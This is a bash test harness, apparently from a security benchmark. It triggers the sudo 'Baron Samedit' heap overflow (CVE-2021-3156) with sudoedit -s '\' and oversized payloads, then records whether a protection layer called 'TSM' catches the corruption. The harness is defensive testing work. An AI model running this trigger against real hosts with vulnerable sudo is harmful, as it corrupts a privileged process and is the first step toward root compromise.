#!/usr/bin/env bash
# CVE-2021-3156 "Baron Samedit" trigger harness for sudo heap overflow
#
# The vulnerability is in sudoedit's argument parsing. When sudoedit
# encounters a backslash at the end of an argument in '-s' (shell) mode,
# set_cmnd() fails to properly stop at the end of the argument, causing
# a heap-based buffer overflow as it writes past the allocated buffer.
#
# Trigger: sudoedit -s '\' followed by a long payload
# Expected stock: heap overflow -> SIGSEGV / SIGABRT or exploitable
# Expected TSM:   canary detects heap corruption, ClampSize heals
set -euo pipefail

RESULT_FILE="/cve_arena/result.json"

echo "[cve_arena] CVE-2021-3156: sudo Baron Samedit heap overflow"

# First, verify we have the vulnerable sudo version
SUDO_VERSION=$(/opt/sudo/bin/sudo --version 2>/dev/null | head -1 || echo "unknown")
echo "[cve_arena] Sudo version: ${SUDO_VERSION}"

# Check if the vulnerability exists (detection probe)
# A patched sudo will reject the -s flag with sudoedit and exit 1
# A vulnerable sudo will attempt to parse the argument and overflow
echo "[cve_arena] Running detection probe..."
VULN_DETECT=false
if /opt/sudo/bin/sudoedit -s '\' 'AAAA' 2>&1 | grep -qi "usage\|not allowed"; then
    echo "[cve_arena] Probe: sudo rejected the input (may be patched)"
else
    VULN_DETECT=true
    echo "[cve_arena] Probe: sudo did not reject (likely vulnerable)"
fi

# Generate the overflow payload
# The overflow size needs to be large enough to corrupt heap metadata
# but we use controlled sizes to avoid runaway exploitation
PAYLOAD_SMALL=$(python3 -c "print('A' * 2048)")
PAYLOAD_MEDIUM=$(python3 -c "print('A' * 16384)")
PAYLOAD_LARGE=$(python3 -c "print('A' * 65536)")

CRASHED=false
SIGNAL=""
HEALED=false
HEALING_ACTIONS="[]"
TRIGGER_EXIT=0

# Attempt 1: Small overflow (just past heap chunk boundary)
echo "[cve_arena] Trigger attempt 1: 2KB payload..."
set +e
OUTPUT1=$(/opt/sudo/bin/sudoedit -s '\' "${PAYLOAD_SMALL}" 2>&1)
EXIT1=$?
set -e
echo "[cve_arena]   Exit code: ${EXIT1}"

if [ ${EXIT1} -ge 128 ]; then
    SIGNAL_NUM=$((EXIT1 - 128))
    case ${SIGNAL_NUM} in
        6)  SIGNAL="SIGABRT" ;;
        11) SIGNAL="SIGSEGV" ;;
        7)  SIGNAL="SIGBUS"  ;;
        *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
    esac
    CRASHED=true
    echo "[cve_arena]   Crashed with signal: ${SIGNAL}"
fi

# Attempt 2: Medium overflow (overwrite adjacent heap chunks)
if [ "${CRASHED}" = "false" ]; then
    echo "[cve_arena] Trigger attempt 2: 16KB payload..."
    set +e
    OUTPUT2=$(/opt/sudo/bin/sudoedit -s '\' "${PAYLOAD_MEDIUM}" 2>&1)
    EXIT2=$?
    set -e
    echo "[cve_arena]   Exit code: ${EXIT2}"

    if [ ${EXIT2} -ge 128 ]; then
        SIGNAL_NUM=$((EXIT2 - 128))
        case ${SIGNAL_NUM} in
            6)  SIGNAL="SIGABRT" ;;
            11) SIGNAL="SIGSEGV" ;;
            7)  SIGNAL="SIGBUS"  ;;
            *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
        esac
        CRASHED=true
        echo "[cve_arena]   Crashed with signal: ${SIGNAL}"
    fi
fi

# Attempt 3: Large overflow (maximize corruption footprint)
if [ "${CRASHED}" = "false" ]; then
    echo "[cve_arena] Trigger attempt 3: 64KB payload..."
    set +e
    OUTPUT3=$(/opt/sudo/bin/sudoedit -s '\' "${PAYLOAD_LARGE}" 2>&1)
    EXIT3=$?
    set -e
    echo "[cve_arena]   Exit code: ${EXIT3}"

    if [ ${EXIT3} -ge 128 ]; then
        SIGNAL_NUM=$((EXIT3 - 128))
        case ${SIGNAL_NUM} in
            6)  SIGNAL="SIGABRT" ;;
            11) SIGNAL="SIGSEGV" ;;
            7)  SIGNAL="SIGBUS"  ;;
            *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
        esac
        CRASHED=true
        echo "[cve_arena]   Crashed with signal: ${SIGNAL}"
    fi
fi

# Check for TSM healing in any of the outputs
ALL_OUTPUT="${OUTPUT1:-}${OUTPUT2:-}${OUTPUT3:-}"
if echo "${ALL_OUTPUT}" | grep -qiE "TSM_HEAL|ClampSize|canary_corrupt|heap_corruption_detected"; then
    HEALED=true
    HEALING_ACTIONS=$(echo "${ALL_OUTPUT}" | \
        grep -oiE "TSM_HEAL[^ ]*|ClampSize|TruncateWithNull|canary_corrupt|heap_corruption_detected" | \
        sort -u | jq -R -s 'split("\n") | map(select(length > 0))')
fi

# Build result JSON
jq -n \
    --arg cve "CVE-2021-3156" \
    --arg software "sudo" \
    --arg version "1.9.5p1" \
    --argjson vuln_detected "${VULN_DETECT}" \
    --argjson crashed "${CRASHED}" \
    --arg signal "${SIGNAL}" \
    --argjson healed "${HEALED}" \
    --argjson healing_actions "${HEALING_ACTIONS}" \
    '{
        cve: $cve,
        software: $software,
        version: $version,
        vulnerability_detected: $vuln_detected,
        crashed: $crashed,
        crash_signal: $signal,
        tsm_healed: $healed,
        tsm_healing_actions: $healing_actions,
        timestamp: (now | todate)
    }' > "${RESULT_FILE}"

echo "[cve_arena] Result:"
cat "${RESULT_FILE}"

if [ "${CRASHED}" = "true" ]; then
    echo "[cve_arena] VERDICT: VULNERABLE (crash detected: ${SIGNAL})"
    exit 2
elif [ "${HEALED}" = "true" ]; then
    echo "[cve_arena] VERDICT: PROTECTED (TSM healed the overflow)"
    exit 0
else
    echo "[cve_arena] VERDICT: INCONCLUSIVE (no crash, no heal signal)"
    exit 3
fi
